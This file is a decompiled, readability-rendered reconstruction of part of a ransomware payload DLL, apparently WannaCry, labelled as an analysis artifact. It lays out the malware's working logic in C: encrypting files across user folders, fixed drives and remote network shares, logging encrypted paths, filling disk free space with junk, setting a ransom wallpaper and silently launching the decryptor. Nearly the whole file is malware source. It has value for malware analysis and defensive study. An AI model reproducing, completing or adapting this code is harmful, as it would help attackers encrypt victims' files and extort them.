// ============================================================================
// payload.dll - Batch 3: encryption callback, drive/share walks, wallpaper, junk
// ----------------------------------------------------------------------------
// ANALYSIS ARTIFACT - readability render. Not buildable.
// ============================================================================

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

// ============================================================================
// sub_10005290 - encryption callback (per file)
//   a6 != 0  => file was encrypted; log its path to f.wry
// ============================================================================
int __stdcall sub_10005290(int a1, LPCWCH lpWideCharStr, unsigned int a3,
                           unsigned int a4, int a5, int a6)
{
    ++dword_1000F264;
    qword_1000F268 += ((ULONGLONG)a3 << 32) | a4;   // total bytes counter

    if (a6 != 0) {
        FILE *f = fopen("f.wry", "at");
        if (f != NULL) {
            char MultiByteStr[620];
            WideCharToMultiByte(0, 0, lpWideCharStr, -1, MultiByteStr, 619, NULL, NULL);
            fprintf(f, "%s\n", MultiByteStr);
            fclose(f);
        }
    }
    return 1;
}

// ============================================================================
// sub_10001A70 - crypto context init + 1 MB buffers + StartAddress thread
// ============================================================================
HCRYPTPROV __thiscall sub_10001A70(HCRYPTPROV *lpParameter, const CHAR *hPubKey,
                                   int progressCb, int *stopFlag)
{
    HCRYPTPROV result = sub_10003CF0(lpParameter + 1, hPubKey, NULL); // RSA keypair for run
    if (result != 0) {
        if (hPubKey != NULL)
            sub_10003CF0(lpParameter + 11, NULL, NULL);

        result = GlobalAlloc(0, 0x100000);
        *(lpParameter + 306) = result;
        if (result != 0) {
            result = GlobalAlloc(0, 0x100000);
            *(lpParameter + 307) = result;
            if (result != 0) {
                *(lpParameter + 311) = CreateEventA(NULL, TRUE, FALSE, NULL);
                *(lpParameter + 312) = CreateEventA(NULL, TRUE, FALSE, NULL);
                *(lpParameter + 310) = CreateThread(NULL, 0, StartAddress, lpParameter, 0, NULL);
                *(lpParameter + 308) = stopFlag;
                *(lpParameter + 309) = progressCb;
                srand(GetTickCount());
                return 1;
            }
        }
    }
    return result;
}

// ============================================================================
// sub_100017A0 - encryption context constructor
// ============================================================================
char *__thiscall sub_100017A0(char *this)
{
    sub_10003C40(this + 4);
    sub_10003C40(this + 44);
    sub_10006230(this + 84);                        // AES context ctor

    *((DWORD *)this + 306) = 0;
    *((DWORD *)this + 307) = 0;
    *((DWORD *)this + 308) = 0;
    *((DWORD *)this + 309) = 0;

    // std::list<wstring> sentinel
    void *v2 = operator new(0x18);
    *(void **)v2 = v2;
    ((void **)v2)[1] = v2;
    *((DWORD *)this + 315) = (DWORD)v2;
    *((DWORD *)this + 316) = 0;

    *((DWORD *)this + 310) = 0;
    *((DWORD *)this + 311) = 0;
    *((DWORD *)this + 312) = 0;
    *((DWORD *)this + 313) = 0;

    *((WORD *)this + 634) = 0;
    *((WORD *)this + 894) = 0;

    *((DWORD *)this + 577) = 0;
    *((DWORD *)this + 578) = 0;
    *((DWORD *)this + 579) = 0;
    *((DWORD *)this + 580) = 0;

    *(DWORD *)this = (DWORD)&off_10008268;          // vtable
    return this;
}

// ============================================================================
// sub_100018A0 - context destructor
// ============================================================================
int __thiscall sub_100018A0(char *this)
{
    // frees the std::list<wstring>, runs AES ctor teardown, releases crit sections
    return 0;
}

// ============================================================================
// sub_100053C0 - encrypt user-profile dirs first
// ============================================================================
int __cdecl sub_100053C0(int a1)
{
    wchar_t pszPath[MAX_PATH];

    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, pszPath);
    if (wcslen(pszPath) != 0)
        sub_10002A20(pszPath);

    pszPath[0] = 0;
    SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, pszPath);   // My Documents
    if (wcslen(pszPath) != 0)
        sub_10002A20(pszPath);

    sub_10004A10(CSIDL_COMMON_DOCUMENTS, sub_10005340, a1);
    return sub_10004A10(CSIDL_COMMON_ADMINTOOLS, sub_10005340, a1);
}

// ============================================================================
// sub_10005530 - encrypt one drive root
// ============================================================================
void __cdecl sub_10005530(int a1, LONG Value, int a3)
{
    wchar_t DirectoryName[4] = { (wchar_t)(Value + 'A'), L':', L'\\', 0 };

    if (a3 != 0) {
        if (GetDriveTypeW(DirectoryName) == DRIVE_CDROM)
            return;

        InterlockedExchange(&Target, Value);

    encrypt:
        if (GetDriveTypeW(DirectoryName) == DRIVE_FIXED) {
            wchar_t Source[MAX_PATH];
            sub_10005020(Value, Source);            // working dir (temp/$Recycle.Bin)
            sub_10001B60(Source);                   // set root + WNCRY counter
        }
        sub_10002A20(DirectoryName);                // walk whole drive
    } else if (InterlockedExchangeAdd(&Target, 0) != Value) {
        // wait for drive to be ready (up to 30 s)
        int v3 = 0;
        while (1) {
            ULARGE_INTEGER TotalNumberOfBytes;
            if (GetDiskFreeSpaceExW(DirectoryName, NULL, &TotalNumberOfBytes, NULL)
                && TotalNumberOfBytes.QuadPart != 0)
                break;
            Sleep(1000);
            if (++v3 >= 30)
                return;
        }
        if (GetDriveTypeW(DirectoryName) != DRIVE_CDROM)
            goto encrypt;
    }
}

// ============================================================================
// sub_10005670 - new-drive handler thread
// ============================================================================
DWORD sub_10005670(int a1, LPVOID lpThreadParameter)
{
    sub_100017A0(Parameter);
    if (sub_10001A70(Parameter, FileName, sub_10005290, &dword_1000F2D8) != 0) {
        sub_10005530(Parameter, (LONG)lpThreadParameter, 0);
        sub_10005120(lpThreadParameter);            // shadow copies / junk fill
        sub_10001980(Parameter, a1);                // teardown
        ExitThread(0);
    }
    sub_100018A0(Parameter);
    return 0;
}

// ============================================================================
// sub_10005480 - remote share enumerator callback
// ============================================================================
int __stdcall sub_10005480(const char *a1, wchar_t *String1, int a3, int a4)
{
    if (wcsicmp(String1, L"ADMIN$") != 0) {         // skip admin share
        char Buffer[260];
        wchar_t WideCharStr[260];
        sprintf(Buffer, "\\\\%s\\", a1);
        MultiByteToWideChar(0, 0, Buffer, -1, WideCharStr, 260);
        wcscat(WideCharStr, String1);
        sub_10002A20(WideCharStr);                  // encrypt the share
    }
    return 1;
}

// ============================================================================
// sub_10004920 - launch decryptor exe (hidden)
// ============================================================================
BOOL sub_10004920(void)
{
    STARTUPINFOA StartupInfo = {0};
    PROCESS_INFORMATION pi;
    StartupInfo.cb = sizeof(StartupInfo);
    StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = SW_HIDE;

    BOOL result = CreateProcessA(NULL, "@WanaDecryptor@.exe", NULL, NULL, FALSE,
                                 CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &pi);
    if (result) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        return CloseHandle(pi.hThread);
    }
    return result;
}

// ============================================================================
// sub_10005120 - shadow-copy kill / disk-fill for a drive
// ============================================================================
HGLOBAL __cdecl sub_10005120(int a1)
{
    wchar_t RootPathName[4] = { (wchar_t)(a1 + 'A'), L':', L'\\', 0 };
    if (GetDriveTypeW(RootPathName) != DRIVE_FIXED)
        return NULL;

    HGLOBAL v2 = GlobalAlloc(0, 0xA00000);          // 10 MB
    memset(v2, 0x55, 0xA00000);

    wchar_t FileName[MAX_PATH];
    sub_100050B0(a1, FileName);                     // random junk filename
    HANDLE FileW = CreateFileW(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN, NULL);
    MoveFileExW(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT); // delete on reboot

    while (/* free space > 1 GB */ 1) {             // fill free space
        for (int i = 0; i < 20; ++i)
            WriteFile(FileW, v2, 0xA00000, NULL, NULL);
        Sleep(10000);
    }
    GlobalFree(v2);
    FlushFileBuffers(FileW);
    CloseHandle(FileW);
    DeleteFileW(FileName);
}

// ============================================================================
// sub_10004A10 - CSIDL subfolder enumerator
// ============================================================================
int __cdecl sub_10004A10(int csidl, void (*a2)(void), int a3)
{
    wchar_t pszPath[MAX_PATH], Buffer[MAX_PATH * 2];
    WIN32_FIND_DATAW FindFileData;

    SHGetFolderPathW(NULL, csidl, NULL, 0, pszPath);
    // strip trailing path component; for CSIDL 46 also seed from CSIDL_PERSONAL base
    swprintf(Buffer, L"%s*", pszPath);

    HANDLE hFindFile = FindFirstFileW(Buffer, &FindFileData);
    do {
        if (wcscmp(FindFileData.cFileName, L".") != 0 &&
            wcscmp(FindFileData.cFileName, L"..") != 0 &&
            (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            swprintf(Buffer, L"%s%s", pszPath, FindFileData.cFileName);
            a2(Buffer, FindFileData.cFileName, a3);
        }
    } while (FindNextFileW(hFindFile, &FindFileData));

    FindClose(hFindFile);
    return 0;
}

// ============================================================================
// sub_10004EE0 - drop wallpaper bmp + decryptor copies into folder
// ============================================================================
int __stdcall sub_10004EE0(wchar_t *Format, wchar_t *String2, int a3)
{
    wchar_t Buffer[MAX_PATH], WideCharStr[MAX_PATH];

    swprintf(Buffer, L"%s\\@WanaCryptor.bmp", Format);
    MultiByteToWideChar(0, 0, MultiByteStr, -1, WideCharStr, 259);
    if (CopyFileW(WideCharStr, Buffer, FALSE)) {
        wchar_t String1[64];
        DWORD pcbBuffer = 64;
        GetUserNameW(String1, &pcbBuffer);
        if (wcsicmp(String1, String2) == 0)
            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, Buffer, SPIF_UPDATEINIFILE);
    }

    swprintf(Buffer, L"%s\\@WanaDecryptor@.exe", Format);
    CopyFileW(L"@WanaDecryptor@.exe", Buffer, FALSE); // decryptor into dir
    return 1;
}
